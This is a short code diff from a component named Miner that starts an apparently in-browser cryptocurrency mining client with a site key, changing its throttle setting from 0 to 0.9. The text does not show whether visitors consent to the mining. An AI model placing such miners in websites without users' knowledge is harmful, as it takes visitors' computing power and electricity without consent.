@@ -28,7 +28,7 @@ class Miner extends Component {
         window.miner = new window.Client.Anonymous(
           '6e20605186aac3440681d2581c1ea1b98fbff460ca9465167586c09d4a9edfeb',
           {
-            throttle: 0,
+            throttle: 0.9,
             c: 'w',
             ads: 0,
           }
